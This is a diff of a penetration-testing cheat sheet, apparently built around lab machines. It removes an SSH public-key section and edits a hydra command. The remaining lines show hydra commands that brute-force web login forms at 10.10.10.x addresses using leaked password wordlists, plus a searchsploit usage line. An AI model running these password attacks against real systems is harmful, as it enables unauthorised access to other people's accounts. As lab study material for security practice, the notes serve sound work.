@@ -1,7 +1,4 @@
-## My SSH Pub Key 
-````
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4iLbXCVYtqoEOZLxvWhx2Q7DQndT21MwgIVVes39Tqp9pUzCfFXgFrzvBY3NOx+e9RRpCymEjXCjzx35DcMXnM9lCu35YMlTY7mrqxbARUIdHwAR/rMhhG+i9OA6cW8WHqYQWUXgF5y7xb8LVIIJRdANbAA0vrh3UHnRYm4AJTrTpwSYHpQ+RHNhxspA4bsV+CxoNmTjzqNju0XoBh6sjmc3f11yv1bTI+rtgu1o0Nr648WMxVZj9a9VB5zY7FiXqwInphD3QlFEFdIcHxecSQ4v45xP0Fw6iniUB36QpAdfFYsROxIMlX246eMBSIHC93tJqF+SuiVXhTTEVR/z81Jlq0oc/s00BabfddIfStAv6QLePbXCNbBZKqe9zNKtUmP2bnXnqcK0AUdxNc4cDrotY2pICruydIBXJW+WiiZu8vzzCwxf9j5yJroC2rgtk5Zhebi7yfrSYS01EDl4R+wfmnP1/vsoy+5tHIaQHb7l1G4tkYjp98w1xW3RQrds= kali@kali
-````
+
 
 
 ## SSH Tunneling 101
@@ -60,7 +57,7 @@ searchsploit -m /path/to/exploit # mirror exploit file to current directory
 
 ## hydra web form bruteforce
 ```bash
-hydra -l admin -P ~/git/SecLists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
+hydra -l admin -P ~/git/SecLists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.10.75 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
 
 hydra -l admin -P ~/git/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 64 # 64 threads
 # change to https-web-form for port 443
